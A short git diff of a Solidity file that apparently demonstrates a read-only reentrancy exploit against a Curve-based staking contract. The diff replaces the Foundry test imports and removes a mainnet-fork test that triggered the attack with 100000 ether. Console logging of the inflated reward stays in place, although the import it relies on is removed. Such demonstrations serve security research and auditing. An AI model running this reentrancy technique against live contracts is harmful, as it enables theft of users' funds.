@@ -1,8 +1,8 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.18;
 
-import "forge-std/Test.sol";
-import "./interface.sol";
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 interface ICurve {
     function get_virtual_price() external view returns (uint);
@@ -115,21 +115,5 @@ contract OperatorContract {
 
         uint reward = target.getReward();
         console.log("Reward if Read-Only Reentrancy is invoked: ", reward);
-    }
-}
-
-contract OperatorTest is Test {
-    OperatorContract public execute;
-    CoreContract public target;
-
-    function setUp() public {
-        vm.createSelectFork("mainnet");
-        target = new CoreContract();
-        execute = new OperatorContract(address(target));
-    }
-
-    function testExecution() public {
-        execute.stakeTokens{value: 10 ether}(); // stake 10 eth in CoreContract
-        execute.performReadOnlyCallback{value: 100000 ether}();
     }
 }
